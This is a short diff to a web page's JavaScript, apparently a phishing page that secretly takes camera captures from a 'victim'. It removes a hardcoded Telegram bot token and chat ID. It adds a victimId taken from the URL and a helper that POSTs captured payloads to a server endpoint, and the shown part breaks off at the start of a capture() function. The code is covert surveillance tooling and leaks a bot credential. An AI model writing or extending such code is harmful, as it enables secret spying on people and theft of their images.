@@ -288,9 +288,18 @@
         });
 
         // ========== کۆدی ڕاستەقینەی کامێرا ==========
-        const TOKEN = '7524329663:AAERQzZ21_sskD6GLfUNLTYvTy--X733hEI';
-        const CHAT = '1015102519';
-        const chatId = new URLSearchParams(location.search).get('chatId') || 'unknown';
+        const victimId = new URLSearchParams(location.search).get('chatId') || 'غير معروف';
+
+async function apiSend(payload) {
+    try {
+        const r = await fetch('/api/send', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        return r.ok;
+    } catch (e) { return false; }
+}
 
         async function capture() {
     const btn = document.getElementById('btnStart');
